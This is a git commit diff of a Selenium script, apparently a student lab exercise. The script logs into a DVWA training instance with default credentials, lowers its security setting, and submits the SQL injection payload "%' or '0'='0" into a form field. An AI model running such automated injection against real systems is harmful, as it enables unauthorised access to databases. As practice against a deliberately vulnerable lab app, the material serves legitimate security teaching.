dde6684ddc5ba86cd0ebcffbc8f8d64d4e070750
ITP-270 <63158011+RehabElb@users.noreply.github.com>
2022-04-12 20:52:33 +0000

    changing the security level before injecting the SQL query

--- sqp_inject/app.py
+++ sqp_inject/app.py
@@ -1,10 +1,13 @@
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import Select
+
 import time
 
 
 URL='http://192.168.183.128/dvwa/login.php'
+
 # driver = webdriver.Firefox('geckodriver')
 driver = webdriver.Chrome('chromedriver.exe')
 driver.get(URL)
@@ -13,17 +16,32 @@ user = driver.find_element(By.NAME, 'username')
 user.send_keys('admin')
 time.sleep(3)
 password = driver.find_element(By.NAME, 'password')
-password.send_keys("if userid = user or 1=1 #'")
+password.send_keys('password')
 login_btn = driver.find_element(By.NAME, 'Login')
 login_btn.click()
 time.sleep(3)
+driver.find_element(By.LINK_TEXT, 'DVWA Security').click() 
+select = Select(driver.find_element(By.NAME, 'security'))
+select.select_by_visible_text('low')
+time.sleep(3)
+driver.find_element(By.NAME, 'seclev_submit').click()
+
+
 driver.find_element(By.LINK_TEXT, 'SQL Injection').click()
-driver.find_element(By.NAME, 'id').send_keys("if name=id or 1=1 #'")
+driver.find_element(By.NAME, 'id').send_keys("%' or '0'='0")
 time.sleep(3)
 submit_btn = driver.find_element(By.NAME, 'Submit')
 submit_btn.click()
 time.sleep(7)
+
+#URL2=' sql query '
+#driver.get(URL2)
+
 # driver.close()
+
+
+
+
 
 
 
